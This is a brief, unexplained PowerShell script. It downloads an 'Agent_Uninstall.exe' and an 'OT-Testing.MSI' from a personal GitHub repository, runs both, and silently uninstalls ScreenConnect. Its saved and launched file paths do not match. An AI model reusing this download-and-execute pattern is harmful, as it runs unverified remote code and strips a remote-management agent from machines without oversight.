Invoke-WebRequest -Uri https://github.com/nightlynx/furry-adventure/raw/main/Agent_Uninstall.exe -Outfile Agent_Uninstall.exe
Invoke-WebRequest -Uri https://github.com/nightlynx/furry-adventure/raw/main/OT-Testing.MSI -Outfile OT-Testing.MSI

powershell.exe start-process -filepath C:\Agent_Uninstall.exe
powershell.exe start-process -filepath C:\OT-Testing.MSI
wmic product where "Name like '%%ScreenConnect%%'" call uninstall /nointeractive
